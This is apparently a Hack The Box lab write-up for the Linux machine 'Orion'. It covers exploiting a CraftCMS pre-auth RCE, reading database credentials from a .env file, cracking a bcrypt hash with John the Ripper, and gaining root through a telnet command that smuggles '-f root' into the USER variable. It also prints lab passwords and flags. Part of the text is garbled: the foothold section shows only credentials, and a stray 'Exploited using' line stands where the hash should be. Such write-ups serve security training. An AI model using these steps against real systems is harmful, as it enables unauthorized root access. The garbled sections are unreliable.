# HTB - Orion (Easy, Linux)

## Info
- **Difficulty:** Easy
- **OS:** Linux (Ubuntu 22.04.5 LTS)
- **Exposed services:** SSH, HTTP (CraftCMS 5.6.16)
- **Skills used:** CVE exploitation (CraftCMS pre-auth RCE), sensitive file enumeration, hash cracking, privilege escalation via local Telnet

## Summary
The box hosts a CMS (CraftCMS 5.6.16) vulnerable to a pre-authentication 
RCE (CVE-2025-32432), exploitable through Metasploit. This initial 
access as `www-data` allows reading a `.env` file containing the MySQL 
database credentials. Querying the database reveals the admin's password 
hash, which is cracked with John the Ripper. This password grants SSH 
access as a regular user. Locally on the machine, a misconfigured 
Telnet service allows direct privilege escalation to root.

## 1. Reconnaissance

Initial nmap scan to identify open ports:

```bash
nmap -sC -sV 10.129.11.176
```

**Result:** 2 open ports — SSH and HTTP.

## 2. Enumeration

Added `orion.htb` to `/etc/hosts` to access the site by hostname. 
Browsing the site revealed **CraftCMS version 5.6.16**. Searching for 
known vulnerabilities for this version led to a pre-authentication RCE, 
tracked as **CVE-2025-32432**.

## 3. Initial Foothold
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!

### Extracting the User Hash

Connected to the MySQL database with these credentials, then queried 
the users table:

```sql
select * from users;
```

**Result:** an admin account `adam` (email `adam@orion.htb`) with a 
bcrypt password hash:
Exploited using

### Cracking the Hash

```bash
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** password found → `darkangel`

### SSH Access

```bash
ssh adam@orion.htb
# Password: darkangel
```

Access confirmed, retrieved the user flag:
```bash
cat user.txt
# df4413cc2882d671b3899af291a516ab
```

## 4. Privilege Escalation

While enumerating local services, found a **Telnet service (GNU 
inetutils 2.7)** listening only on localhost (127.0.0.1) — invisible 
from outside but accessible from the machine itself.

This version of Telnet is vulnerable to a known user impersonation 
technique via the `USER` environment variable combined with the `-f` 
flag (which assumes authentication was already handled, similar to 
`rlogin`):

```bash
USER="-f root" telnet -a 127.0.0.1
```

**Result:** direct login as **root**, with no password required, due 
to improper handling of the `-f` option by this Telnet service.

Retrieved the root flag:
```bash
cat root.txt
# 64780312542b8d3df7cf003c24e8c20c
```

## Key Takeaways
- Recent CVEs in popular CMS platforms (CraftCMS here) remain a common 
  entry point — staying up to date on published CVEs is essential.
- `.env` files are a classic target once web access is obtained — they 
  often contain secrets in plaintext (DB credentials, API keys, etc.).
- A service that appears "safe" because it's bound to localhost (like 
  this Telnet instance) can still be a privesc vector if misconfigured — 
  never skip enumerating local-only services during post-exploitation.
- The `-f` option in some Telnet clients (inherited from `rlogin`) can 
  allow user impersonation if the service doesn't properly verify 
  authentication.
